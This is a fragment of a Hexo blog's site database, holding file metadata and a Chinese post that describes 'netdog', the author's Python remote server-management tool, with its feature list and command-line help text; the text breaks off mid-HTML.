ts/fa-brands-400.svg","hash":"5e2d2a159294576bea69cc3360efb5ffe110ab2d","modified":1617435297103},{"_id":"public/libs/awesome/webfonts/fa-solid-900.svg","hash":"7da88b19e1486f8c968d3cf5ab3f194f01ea17fd","modified":1617435297103},{"_id":"source/_posts/netdog.md","hash":"90cc14befc010b9acbcdadded569196c18c589e1","modified":1617437033719},{"_id":"public/2021/04/03/netdog/index.html","hash":"7dbb943353b40eff32367207d6a646c681653c46","modified":1628261813393},{"_id":"public/tags/编程/index.html","hash":"66a7dad4db5056fd929c80dfa48cca975a7953e7","modified":1628261035485},{"_id":"source/tags/index.md","hash":"98ee5120dbd198bf8c4310528ba8db5995a35afa","modified":1617441115066},{"_id":"public/tags/index.html","hash":"a1fa77b4a9f74ceab49d64a4996155d4f809b932","modified":1628261035485},{"_id":"source/_drafts/tag.md","hash":"669b891a2b44db6542d0385448c418edf522116d","modified":1617440457285},{"_id":"source/categories/index.md","hash":"37b9f68fe36e66cbaa6e72724821d6db3351c2e3","modified":1617441203355},{"_id":"public/categories/index.html","hash":"4449aa52b0049c62195b1bcc030dcfb290048f7d","modified":1628261035485},{"_id":"source/_posts/django学习笔记.md","hash":"748f9367c54990ba13fa8a9f9949fecc320a503b","modified":1617548336604},{"_id":"public/2021/04/04/django学习笔记/index.html","hash":"cf31ef54d188271d95ee986194f7b6b3060e168c","modified":1628261813393},{"_id":"source/_posts/SUID越权利用.md","hash":"939379714fbd1cef1715193017258ee514cafc53","modified":1618062236105},{"_id":"public/2021/04/10/SUID越权利用/index.html","hash":"475522e8a077fb45e5a53cc2ba84ffb9757cd65d","modified":1628261813393},{"_id":"public/tags/SUID-渗透测试/index.html","hash":"1b1950fdc7f0075a3f576b4cf2d9dbda4b5cc315","modified":1628261035485},{"_id":"source/_posts/x86实模式&保护模式.md","hash":"cdb3279151a4afb9edad85c5d32282f12ad52271","modified":1628255536018},{"_id":"source/_posts/一起来打靶Write-Up.md","hash":"b3cb3e847af80b487629985c3bb0167ec15de4c4","modified":1628255536459},{"_id":"themes/hexo-theme-matery/source/.DS_Store","hash":"b1c7e3b9430c0cac2bcea6ed2c8a3dafecc87e59","modified":1628260041549},{"_id":"themes/hexo-theme-matery/source/medias/huaji.jpg","hash":"b01966d2119950fc1eaafc4e75cc244af0d5f30a","modified":1628259970034},{"_id":"source/about/index.md","hash":"aa183eeec3f8f5bc080fa6efc6a63476d2e3aba1","modified":1628260161459},{"_id":"themes/hexo-theme-matery/source/404.html","hash":"ba59928d84889b8e1a905bcd2da215c34a8bb9c8","modified":1628261804550},{"_id":"source/404/index.md","hash":"537d2c9e70ead12e75eb433a47d375a35f8bc849","modified":1628260660842},{"_id":"source/404/index.html","hash":"537d2c9e70ead12e75eb433a47d375a35f8bc849","modified":1628260660842},{"_id":"source/index.html","hash":"537d2c9e70ead12e75eb433a47d375a35f8bc849","modified":1628260660842},{"_id":"public/about/index.html","hash":"0b91e1ac3fc124e4a046b5b6e2aa9852f097a4ac","modified":1628261813393},{"_id":"public/2021/08/05/x86实模式&保护模式/index.html","hash":"3bafe4736afe7657f431db7f0a5714be866d4dff","modified":1628261813393},{"_id":"public/2021/08/04/一起来打靶Write-Up/index.html","hash":"0f5d9775b6bfa22a917f6070fccf4f0dcdfb40cc","modified":1628261813393},{"_id":"public/archives/2021/08/index.html","hash":"bb4db42932f786e31dc1d5c030cb3d8b3058297e","modified":1628261035485},{"_id":"public/tags/打靶/index.html","hash":"e05519f6d77d0bf657dee891056b0810badb3242","modified":1628261035485},{"_id":"public/tags/OS/index.html","hash":"29fb0a4e1326bdae94e50f74e918fc87597083b1","modified":1628261035485},{"_id":"public/medias/huaji.jpg","hash":"b01966d2119950fc1eaafc4e75cc244af0d5f30a","modified":1628261035485},{"_id":"source/404.md","hash":"c122eca70ff35ecc3be9121b00c6659494c3d0ad","modified":1628261221198},{"_id":"public/404.html","hash":"ba59928d84889b8e1a905bcd2da215c34a8bb9c8","modified":1628262041098},{"_id":"themes/hexo-theme-matery/404.html","hash":"ba59928d84889b8e1a905bcd2da215c34a8bb9c8","modified":1628261804550}],"Category":[],"Data":[],"Page":[{"title":"categories","date":"2021-04-03T09:12:12.000Z","type":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2021-04-03 17:12:12\ntype: \"categories\"\nlayout: \"categories\"\n---\n","updated":"2021-04-03T09:13:23.355Z","path":"categories/index.html","comments":1,"_id":"ckn1iqoi80000n6vz4mg59dl4","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2021-04-03T09:11:24.000Z","type":"tags","layout":"tags","_content":"\n","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2021-04-03 17:11:24\ntype: \"tags\"\nlayout: \"tags\"\n---\n\n","updated":"2021-04-03T09:11:55.066Z","path":"tags/index.html","comments":1,"_id":"ckn1iqoia0001n6vzaxxdhj9w","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"about","date":"2021-08-06T14:29:21.000Z","_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2021-08-06 22:29:21\n---\n","updated":"2021-08-06T14:29:21.459Z","path":"about/index.html","comments":1,"layout":"page","_id":"cks0g2npq0000o77fax5k4pdh","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"netdog","date":"2021-04-03T08:01:37.000Z","_content":"详情请看github\n[GitHub]: https://github.com/busizhiya/netdog/\n\n## 程序设计项目作品创作说明\n\n### 作品名称： netdog\n\n### 创作思想（创作背景、目的和意义）\n\n作者是一名网络安全与计算机的爱好者,经常折腾云服务器、研究主机控制等内容.迫于经典的云服务器只具有命令行界面,且每次都需要使用ssh登陆,十分的低效且麻烦.开发本程序.\n本程序针对服务器设计,以高效的(云)主机管理为目标,以安全的数据传输为基础,以强大的稳定性与高技术含量为宗旨,编写了此款软件.集成了密码登陆、加密传输、文件上传/下载、命令执行、会话交流等功能.\n采用python3.8编程.本程序虽使用命令行进行控制,但创新的虚拟交互终端使操作控制十分便捷,并且具有持续管理能力.会话存储功能使每一次登陆都十分便捷.\n\n### 创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）\n\n本作品技术含量极高,运用python中的许多高级语法:\n\n#### 1.类的思想、封装与接口\n\n自定义的会话类,内部维护了socket实例.自动检测socket状态进行删除与提示.\n在内部根据会话类型进行不同的初始化.向外部提供了封装过的管理函数.\n\n#### 2.会话存储\n\n对于如上的会话类,本程序结合了IO操作与网络编程,将会话信息以JSON格式保存在本地,以方便下次直接连接服务器.简化了程序的操作流程,减小了使用难度.\n\n#### 3.多线程处理\n\n同时持有多个会话,每一个会话单独创建一个线程进行管理,互不干扰.\n\n#### 4.socket网络编程\n\n使用TCP进行传输.Socket可以说是本程序的精髓所在,对socket的状态、内容、信息进行处理,建立可靠灵活的socket管理,并对各种情况进行处理,适应各种网络环境.\n\n#### 5.异常处理\n\n程序因涉及到网络,故异常与突发状况较多.故采用多级分类的异常处理模块,对不同类型的异常进行不同的处理,对症下药,增加了程序的健壮性.\n\n#### 6.指令性\n\n对于复杂而多种多样的操作,每一条信息都归属于一个大的操作模块,而不同的操作有不同的执行.每条指令都以[EOF]结尾,并与封装性结合,提供读取接口,在编码时十分方便.\n\n#### 7.编码自适应/转换\n\n跨平台可以说是所有软件都无法避免的一个难题.对于windows常用的gbk与linux广泛使用的utf-8两种编码,本程序拥有编码自适应的功能,不用害怕跨平台乱码了!\n\n#### 8.加密&解密\n\n本程序不但拥有逻辑上的登陆密码,还有物理传输层面的加密.对于每一个会话都会生成一个独一无二的密钥进行加密,每一次传输都会先进行加密,在接收端再进行解密,避免了传输过程中的信息泄露或中间人攻击,极大地增强了安全性\n\n#### 9.DEBUG模式\n\n本程序共有900余行代码,按理来说维护十分困难.万幸,本程序提供了DEBUG模式,对于各部分的错误与信息进行输出与调试,极大减少了二次开发的成本.\n\n#### 10.多操作系统自适应\n\n此优势与第(7)条有异曲同工之妙.程序会自动根据当前的操作系统,进行相应的自适应操作,增加了跨平台的能力.\n\n#### 11.虚拟终端\n\n交互式的虚拟终端,模仿shell进行改进,极大增强了用户的操作手感.与此同时,本程序配有完善的信息提示系统,随时告知使用者当前事件.其中提供了些许自定义的功能指令,但却没有过多地增加原版shell的内容,可加以改进.\n12.命令行参数获取\n如上,本程序虽提供了虚拟终端,但为了方便外部脚本的调用,本程序也提供了必要的参数,增强了与外界的交流性.\n\n#### 13.动态类调用\n\n对于如上的虚拟终端,本程序使用了动态类调用的技术,极大地减少了代码的冗余度,增加了代码效率,遵守了了python程序的设计理念(python之禅)\n\n#### 14.MVC设计模式\n\nModel、View、Controller.此理念源自Java的学习中,结合了面向对象的思想.会话类则是其中的Model封装了对外的接口.View则是强大的提示系统、DEBUG模式与编码系统,对各种信息进行处理输出.Controller是本程序中的holder函数.对各种指令进行集中操作与管理.\n\n### 原创部分\n\n虚拟终端、指令性传输、传输加密、DEBUG模式、编码自适应、会话存储、操作系统自适应.\n\n### 参考资源（参考或引用他人资源及出处）\n\n《Python黑帽子编程》\n\n### 制作用软件及运行环境\n\nMacOs PyCharm\nPython3.8\n跨平台\n\n### 其他说明（需要特别说明的问题）\n\n#### 1.建议密码不要设置为中文,在文件传输时会有问题.\n\n#### 2.请使用Python3运行此脚本.请注意终端的编码模式\n\n#### 3.上传/下载文件请不要选择大文件进行测试,内存会溢出.\n\n默认监听端口:33445\n\n\n\n### 1.命令行参数\n\n```markdown\nusage:\n        -h,--help   -->  帮助\n        -t,--target -->  设置目标主机地址\n        -p,--port   -->  设置目标主机端口\n        -l,--listen -->  开启监听模式\n        -d,--debug  -->  开启debug模式\n        -k,--key    -->  设置登陆密码\n```\n\n### 2.服务端交互命令\n\n```markdown\n服务端使用说明:\n        help          -->  帮助\n        disconnect,disc  -->  断开连接\n        session       -->  会话管理\n                -l,--list    -->   列出所有会话\n                -c,--change  -->   更改持有会话\n        mode          -->  更改模式\n                -t,--talk    -->   对话模式\n        key           -->  登陆密码管理\n                -s,--set   -->    设置密码\n                -l,--list  -->    显示密码\n                -c,--close -->    关闭密码登陆(无需密码登录)\n```\n\n### 3.客户端交互命令\n\n```markdown\n客户端使用说明:\n        help          -->  帮助\n        disconnect,disc      -->  断开连接\n                -i,--id         -->  选择要断开的会话id(默认为当前持有会话)\n        backgroud,bg  -->  后台模式\n        session       -->  会话管理\n                -l,--list    -->   列出所有会话\n                -c,--change  -->   更改持有会话\n        mode          -->  更改模式\n                -t,--talk    -->    对话模式\n                -s,--shell   -->    shell模式\n        connect     -->  连接到远程主机\n                -t,--target     -->   设置目标主机地址 (默认为--127.0.0.1)\n                -p,--port       -->   设置目标主机端口 (默认为-33445)\n                -P,--password   -->   使用密码登陆目标主机\n        upload   `FILENAME` -->   上传文件\n        download `FILENAME` -->   下载文件\n```\n\n\n\n","source":"_posts/netdog.md","raw":"---\ntitle: netdog\ndate: 2021-04-03 16:01:37\ntags: 编程\n---\n详情请看github\n[GitHub]: https://github.com/busizhiya/netdog/\n\n## 程序设计项目作品创作说明\n\n### 作品名称： netdog\n\n### 创作思想（创作背景、目的和意义）\n\n作者是一名网络安全与计算机的爱好者,经常折腾云服务器、研究主机控制等内容.迫于经典的云服务器只具有命令行界面,且每次都需要使用ssh登陆,十分的低效且麻烦.开发本程序.\n本程序针对服务器设计,以高效的(云)主机管理为目标,以安全的数据传输为基础,以强大的稳定性与高技术含量为宗旨,编写了此款软件.集成了密码登陆、加密传输、文件上传/下载、命令执行、会话交流等功能.\n采用python3.8编程.本程序虽使用命令行进行控制,但创新的虚拟交互终端使操作控制十分便捷,并且具有持续管理能力.会话存储功能使每一次登陆都十分便捷.\n\n### 创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）\n\n本作品技术含量极高,运用python中的许多高级语法:\n\n#### 1.类的思想、封装与接口\n\n自定义的会话类,内部维护了socket实例.自动检测socket状态进行删除与提示.\n在内部根据会话类型进行不同的初始化.向外部提供了封装过的管理函数.\n\n#### 2.会话存储\n\n对于如上的会话类,本程序结合了IO操作与网络编程,将会话信息以JSON格式保存在本地,以方便下次直接连接服务器.简化了程序的操作流程,减小了使用难度.\n\n#### 3.多线程处理\n\n同时持有多个会话,每一个会话单独创建一个线程进行管理,互不干扰.\n\n#### 4.socket网络编程\n\n使用TCP进行传输.Socket可以说是本程序的精髓所在,对socket的状态、内容、信息进行处理,建立可靠灵活的socket管理,并对各种情况进行处理,适应各种网络环境.\n\n#### 5.异常处理\n\n程序因涉及到网络,故异常与突发状况较多.故采用多级分类的异常处理模块,对不同类型的异常进行不同的处理,对症下药,增加了程序的健壮性.\n\n#### 6.指令性\n\n对于复杂而多种多样的操作,每一条信息都归属于一个大的操作模块,而不同的操作有不同的执行.每条指令都以[EOF]结尾,并与封装性结合,提供读取接口,在编码时十分方便.\n\n#### 7.编码自适应/转换\n\n跨平台可以说是所有软件都无法避免的一个难题.对于windows常用的gbk与linux广泛使用的utf-8两种编码,本程序拥有编码自适应的功能,不用害怕跨平台乱码了!\n\n#### 8.加密&解密\n\n本程序不但拥有逻辑上的登陆密码,还有物理传输层面的加密.对于每一个会话都会生成一个独一无二的密钥进行加密,每一次传输都会先进行加密,在接收端再进行解密,避免了传输过程中的信息泄露或中间人攻击,极大地增强了安全性\n\n#### 9.DEBUG模式\n\n本程序共有900余行代码,按理来说维护十分困难.万幸,本程序提供了DEBUG模式,对于各部分的错误与信息进行输出与调试,极大减少了二次开发的成本.\n\n#### 10.多操作系统自适应\n\n此优势与第(7)条有异曲同工之妙.程序会自动根据当前的操作系统,进行相应的自适应操作,增加了跨平台的能力.\n\n#### 11.虚拟终端\n\n交互式的虚拟终端,模仿shell进行改进,极大增强了用户的操作手感.与此同时,本程序配有完善的信息提示系统,随时告知使用者当前事件.其中提供了些许自定义的功能指令,但却没有过多地增加原版shell的内容,可加以改进.\n12.命令行参数获取\n如上,本程序虽提供了虚拟终端,但为了方便外部脚本的调用,本程序也提供了必要的参数,增强了与外界的交流性.\n\n#### 13.动态类调用\n\n对于如上的虚拟终端,本程序使用了动态类调用的技术,极大地减少了代码的冗余度,增加了代码效率,遵守了了python程序的设计理念(python之禅)\n\n#### 14.MVC设计模式\n\nModel、View、Controller.此理念源自Java的学习中,结合了面向对象的思想.会话类则是其中的Model封装了对外的接口.View则是强大的提示系统、DEBUG模式与编码系统,对各种信息进行处理输出.Controller是本程序中的holder函数.对各种指令进行集中操作与管理.\n\n### 原创部分\n\n虚拟终端、指令性传输、传输加密、DEBUG模式、编码自适应、会话存储、操作系统自适应.\n\n### 参考资源（参考或引用他人资源及出处）\n\n《Python黑帽子编程》\n\n### 制作用软件及运行环境\n\nMacOs PyCharm\nPython3.8\n跨平台\n\n### 其他说明（需要特别说明的问题）\n\n#### 1.建议密码不要设置为中文,在文件传输时会有问题.\n\n#### 2.请使用Python3运行此脚本.请注意终端的编码模式\n\n#### 3.上传/下载文件请不要选择大文件进行测试,内存会溢出.\n\n默认监听端口:33445\n\n\n\n### 1.命令行参数\n\n```markdown\nusage:\n        -h,--help   -->  帮助\n        -t,--target -->  设置目标主机地址\n        -p,--port   -->  设置目标主机端口\n        -l,--listen -->  开启监听模式\n        -d,--debug  -->  开启debug模式\n        -k,--key    -->  设置登陆密码\n```\n\n### 2.服务端交互命令\n\n```markdown\n服务端使用说明:\n        help          -->  帮助\n        disconnect,disc  -->  断开连接\n        session       -->  会话管理\n                -l,--list    -->   列出所有会话\n                -c,--change  -->   更改持有会话\n        mode          -->  更改模式\n                -t,--talk    -->   对话模式\n        key           -->  登陆密码管理\n                -s,--set   -->    设置密码\n                -l,--list  -->    显示密码\n                -c,--close -->    关闭密码登陆(无需密码登录)\n```\n\n### 3.客户端交互命令\n\n```markdown\n客户端使用说明:\n        help          -->  帮助\n        disconnect,disc      -->  断开连接\n                -i,--id         -->  选择要断开的会话id(默认为当前持有会话)\n        backgroud,bg  -->  后台模式\n        session       -->  会话管理\n                -l,--list    -->   列出所有会话\n                -c,--change  -->   更改持有会话\n        mode          -->  更改模式\n                -t,--talk    -->    对话模式\n                -s,--shell   -->    shell模式\n        connect     -->  连接到远程主机\n                -t,--target     -->   设置目标主机地址 (默认为--127.0.0.1)\n                -p,--port       -->   设置目标主机端口 (默认为-33445)\n                -P,--password   -->   使用密码登陆目标主机\n        upload   `FILENAME` -->   上传文件\n        download `FILENAME` -->   下载文件\n```\n\n\n\n","slug":"netdog","published":1,"updated":"2021-04-03T08:03:53.719Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckn1g92d30000d0vz3g030hxq","content":"<p>详情请看github<br>[GitHub]: <a href=\"https://github.com/busizhiya/netdog/\">https://github.com/busizhiya/netdog/</a></p>\n<h2 id=\"程序设计项目作品创作说明\"><a href=\"#程序设计项目作品创作说明\" class=\"headerlink\" title=\"程序设计项目作品创作说明\"></a>程序设计项目作品创作说明</h2><h3 id=\"作品名称：-netdog\"><a href=\"#作品名称：-netdog\" class=\"headerlink\" title=\"作品名称： netdog\"></a>作品名称： netdog</h3><h3 id=\"创作思想（创作背景、目的和意义）\"><a href=\"#创作思想（创作背景、目的和意义）\" class=\"headerlink\" title=\"创作思想（创作背景、目的和意义）\"></a>创作思想（创作背景、目的和意义）</h3><p>作者是一名网络安全与计算机的爱好者,经常折腾云服务器、研究主机控制等内容.迫于经典的云服务器只具有命令行界面,且每次都需要使用ssh登陆,十分的低效且麻烦.开发本程序.<br>本程序针对服务器设计,以高效的(云)主机管理为目标,以安全的数据传输为基础,以强大的稳定性与高技术含量为宗旨,编写了此款软件.集成了密码登陆、加密传输、文件上传/下载、命令执行、会话交流等功能.<br>采用python3.8编程.本程序虽使用命令行进行控制,但创新的虚拟交互终端使操作控制十分便捷,并且具有持续管理能力.会话存储功能使每一次登陆都十分便捷.</p>\n<h3 id=\"创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）\"><a href=\"#创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）\" class=\"headerlink\" title=\"创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）\"></a>创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）</h3><p>本作品技术含量极高,运用python中的许多高级语法:</p>\n<h4 id=\"1-类的思想、封装与接口\"><a href=\"#1-类的思想、封装与接口\" class=\"headerlink\" title=\"1.类的思想、封装与接口\"></a>1.类的思想、封装与接口</h4><p>自定义的会话类,内部维护了socket实例.自动检测socket状态进行删除与提示.<br>在内部根据会话类型进行不同的初始化.向外部提供了封装过的管理函数.</p>\n<h4 id=\"2-会话存储\"><a href=\"#2-会话存储\" class=\"headerlink\" title=\"2.会话存储\"></a>2.会话存储</h4><p>对于如上的会话类,本程序结合了IO操作与网络编程,将会话信息以JSON格式保存在本地,以方便下次直接连接服务器.简化了程序的操作流程,减小了使用难度.</p>\n<h4 id=\"3-多线程处理\"><a href=\"#3-多线程处理\" class=\"headerlink\" title=\"3.多线程处理\"></a>3.多线程处理</h4><p>同时持有多个会话,每一个会话单独创建一个线程进行管理,互不干扰.</p>\n<h4 id=\"4-socket网络编程\"><a href=\"#4-socket网络编程\" class=\"headerlink\" title=\"4.socket网络编程\"></a>4.socket网络编程</h4><p>使用TCP进行传输.Socket可以说是本程序的精髓所在,对socket的状态、内容、信息进行处理,建立可靠灵活的socket管理,并对各种情况进行处理,适应各种网络环境.</p>\n<h4 id=\"5-异常处理\"><a href=\"#5-异常处理\" class=\"headerlink\" title=\"5.异常处理\"></a>5.异常处理</h4><p>程序因涉及到网络,故异常与突发状况较多.故采用多级分类的异常处理模块,对不同类型的异常进行不同的处理,对症下药,增加了程序的健壮性.</p>\n<h4 id=\"6-指令性\"><a href=\"#6-指令性\" class=\"headerlink\" title=\"6.指令性\"></a>6.指令性</h4><p>对于复杂而多种多样的操作,每一条信息都归属于一个大的操作模块,而不同的操作有不同的执行.每条指令都以[EOF]结尾,并与封装性结合,提供读取接口,在编码时十分方便.</p>\n<h4 id=\"7-编码自适应-转换\"><a href=\"#7-编码自适应-转换\" class=\"headerlink\" title=\"7.编码自适应/转换\"></a>7.编码自适应/转换</h4><p>跨平台可以说是所有软件都无法避免的一个难题.对于windows常用的gbk与linux广泛使用的utf-8两种编码,本程序拥有编码自适应的功能,不用害怕跨平台乱码了!</p>\n<h4 id=\"8-加密-amp-解密\"><a href=\"#8-加密-amp-解密\" class=\"headerlink\" title=\"8.加密&amp;解密\"></a>8.加密&amp;解密</h4><p>本程序不但拥有逻辑上的登陆密码,还有物理传输层面的加密.对于每一个会话都会生成一个独一无二的密钥进行加密,每一次传输都会先进行加密,在接收端再进行解密,避免了传输过程中的信息泄露或中间人攻击,极大地增强了安全性</p>\n<h4 id=\"9-DEBUG模式\"><a href=\"#9-DEBUG模式\" class=\"headerlink\" title=\"9.DEBUG模式\"></a>9.DEBUG模式</h4><p>本程序共有900余行代码,按理来说维护十分困难.万幸,本程序提供了DEBUG模式,对于各部分的错误与信息进行输出与调试,极大减少了二次开发的成本.</p>\n<h4 id=\"10-多操作系统自适应\"><a href=\"#10-多操作系统自适应\" class=\"headerlink\" title=\"10.多操作系统自适应\"></a>10.多操作系统自适应</h4><p>此优势与第(7)条有异曲同工之妙.程序会自动根据当前的操作系统,进行相应的自适应操作,增加了跨平台的能力.</p>\n<h4 id=\"11-虚拟终端\"><a href=\"#11-虚拟终端\" class=\"headerlink\" title=\"11.虚拟终端\"></a>11.虚拟终端</h4><p>交互式的虚拟终端,模仿shell进行改进,极大增强了用户的操作手感.与此同时,本程序配有完善的信息提示系统,随时告知使用者当前事件.其中提供了些许自定义的功能指令,但却没有过多地增加原版shell的内容,可加以改进.<br>12.命令行参数获取<br>如上,本程序虽提供了虚拟终端,但为了方便外部脚本的调用,本程序也提供了必要的参数,增强了与外界的交流性.</p>\n<h4 id=\"13-动态类调用\"><a href=\"#13-动态类调用\" class=\"headerlink\" title=\"13.动态类调用\"></a>13.动态类调用</h4><p>对于如上的虚拟终端,本程序使用了动态类调用的技术,极大地减少了代码的冗余度,增加了代码效率,遵守了了python程序的设计理念(python之禅)</p>\n<h4 id=\"14-MVC设计模式\"><a href=\"#14-MVC设计模式\" class=\"headerlink\" title=\"14.MVC设计模式\"></a>14.MVC设计模式</h4><p>Model、View、Controller.此理念源自Java的学习中,结合了面向对象的思想.会话类则是其中的Model封装了对外的接口.View则是强大的提示系统、DEBUG模式与编码系统,对各种信息进行处理输出.Controller是本程序中的holder函数.对各种指令进行集中操作与管理.</p>\n<h3 id=\"原创部分\"><a href=\"#原创部分\" class=\"headerlink\" title=\"原创部分\"></a>原创部分</h3><p>虚拟终端、指令性传输、传输加密、DEBUG模式、编码自适应、会话存储、操作系统自适应.</p>\n<h3 id=\"参考资源（参考或引用他人资源及出处）\"><a href=\"#参考资源（参考或引用他人资源及出处）\" class=\"headerlink\" title=\"参考资源（参考或引用他人资源及出处）\"></a>参考资源（参考或引用他人资源及出处）</h3><p>《Python黑帽子编程》</p>\n<h3 id=\"制作用软件及运行环境\"><a href=\"#制作用软件及运行环境\" class=\"headerlink\" title=\"制作用软件及运行环境\"></a>制作用软件及运行环境</h3><p>MacOs PyCharm<br>Python3.8<br>跨平台</p>\n<h3 id=\"其他说明（需要特别说明的问题）\"><a href=\"#其他说明（需要特别说明的问题）\" class=\"headerlink\" title=\"其他说明（需要特别说明的问题）\"></a>其他说明（需要特别说明的问题）</h3><h4 id=\"1-建议密码不要设置为中文-在文件传输时会有问题\"><a href=\"#1-建议密码不要设置为中文-在文件传输时会有问题\" class=\"headerlink\" title=\"1.建议密码不要设置为中文,在文件传输时会有问题.\"></a>1.建议密码不要设置为中文,在文件传输时会有问题.</h4><h4 id=\"2-请使用Python3运行此脚本-请注意终端的编码模式\"><a href=\"#2-请使用Python3运行此脚本-请注意终端的编码模式\" class=\"headerlink\" title=\"2.请使用Python3运行此脚本.请注意终端的编码模式\"></a>2.请使用Python3运行此脚本.请注意终端的编码模式</h4><h4 id=\"3-上传-下载文件请不要选择大文件进行测试-内存会溢出\"><a href=\"#3-上传-下载文件请不要选择大文件进行测试-内存会溢出\" class=\"headerlink\" title=\"3.上传/下载文件请不要选择大文件进行测试,内存会溢出.\"></a>3.上传/下载文件请不要选择大文件进行测试,内存会溢出.</h4><p>默认监听端口:33445</p>\n<h3 id=\"1-命令行参数\"><a href=\"#1-命令行参数\" class=\"headerlink\" title=\"1.命令行参数\"></a>1.命令行参数</h3><figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usage:</span><br><span class=\"line\"><span class=\"code\">        -h,--help   --&gt;  帮助</span></span><br><span class=\"line\"><span class=\"code\">        -t,--target --&gt;  设置目标主机地址</span></span><br><span class=\"line\"><span class=\"code\">        -p,--port   --&gt;  设置目标主机端口</span></span><br><span class=\"line\"><span class=\"code\">        -l,--listen --&gt;  开启监听模式</span></span><br><span class=\"line\"><span class=\"code\">        -d,--debug  --&gt;  开启debug模式</span></span><br><span class=\"line\"><span class=\"code\">        -k,--key    --&gt;  设置登陆密码</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-服务端交互命令\"><a href=\"#2-服务端交互命令\" class=\"headerlink\" title=\"2.服务端交互命令\"></a>2.服务端交互命令</h3><figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">服务端使用说明:</span><br><span class=\"line\"><span class=\"code\">        help          --&gt;  帮助</span></span><br><span class=\"line\"><span class=\"code\">        disconnect,disc  --&gt;  断开连接</span></span><br><span class=\"line\"><span class=\"code\">        session       --&gt;  会话管理</span></span><br><span class=\"line\"><span class=\"code\">                -l,--list    --&gt;   列出所有会话</span></span><br><span class=\"line\"><span class=\"code\">                -c,--change  --&gt;   更改持有会话</span></span><br><span class=\"line\"><span class=\"code\">        mode          --&gt;  更改模式</span></span><br><span class=\"line\"><span class=\"code\">                -t,--talk    --&gt;   对话模式</span></span><br><span class=\"line\"><span class=\"code\">        key           --&gt;  登陆密码管理</span></span><br><span class=\"line\"><span class=\"code\">                -s,--set   --&gt;    设置密码</span></span><br><span class=\"line\"><span class=\"code\">                -l,--list  --&gt;    显示密码</span></span><br><span class=\"line\"><span class=\"code\">                -c,--close --&gt;    关闭密码登陆(无需密码登录)</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-客户端交互命令\"><a href=\"#3-客户端交互命令\" class=\"headerlink\" title=\"3.客户端交互命令\"></a>3.客户端交互命令</h3><figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端使用说明:</span><br><span class=\"line\"><span class=\"code\">        help          --&gt;  帮助</span></span><br><span class=\"line\"><span class=\"code\">        disconnect,disc      --&gt;  断开连接</span></span><br><span class=\"line\"><span class=\"code\">                -i,--id         --&gt;  选择要断开的会话id(默认为当前持有会话)</span></span><br><span class=\"line\"><span class=\"code\">        backgroud,bg  --&gt;  后台模式</span></span><br><span class=\"line\"><span class=\"code\">        session       --&gt;  会话管理</span></span><br><span class=\"line\"><span class=\"code\">                -l,--list    --&gt;   列出所有会话</span></span><br><span class=\"line\"><span class=\"code\">                -c,--change  --&gt;   更改持有会话</span></span><br><span class=\"line\"><span class=\"code\">        mode          --&gt;  更改模式</span></span><br><span class=\"line\"><span class=\"code\">                -t,--talk    --&gt;    对话模式</span></span><br><span class=\"line\"><span class=\"code\">                -s,--shell   --&gt;    shell模式</span></span><br><span class=\"line\"><span class=\"code\">        connect     --&gt;  连接到远程主机</span></span><br><span class=\"line\"><span class=\"code\">                -t,--target     --&gt;   设置目标主机地址 (默认为--127.0.0.1)</span></span><br><span class=\"line\"><span class=\"code\">                -p,--port       --&gt;   设置目标主机端口 (默认为-33445)</span></span><br><span class=\"line\"><span class=\"code\">                -P,--password   --&gt;   使用密码登陆目标主机</span></span><br><span class=\"line\"><span class=\"code\">        upload   `FILENAME` --&gt;   上传文件</span></span><br><span class=\"line\"><span class=\"code\">        download `FILENAME` --&gt;   下载文件</span></span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<p>详情请看github<br>[GitHub]: <a href=\"https://github.com/busizhiya/netdog/\">https://github.com/busizhiya/netdog/</a></p>\n<h2 id=\"程序设计项目作品创作说明\"><a href=\"#程序设计项目作品创作说明\" class=\"headerlink\" title=\"程序设计项目作品创作说明\"></a>程序设计项目作品创作说明</h2><h3 id=\"作品名称：-netdog\"><a href=\"#作品名称：-netdog\" class=\"headerlink\" title=\"作品名称： netdog\"></a>作品名称： netdog</h3><h3 id=\"创作思想（创作背景、目的和意义）\"><a href=\"#创作思想（创作背景、目的和意义）\" class=\"headerlink\" 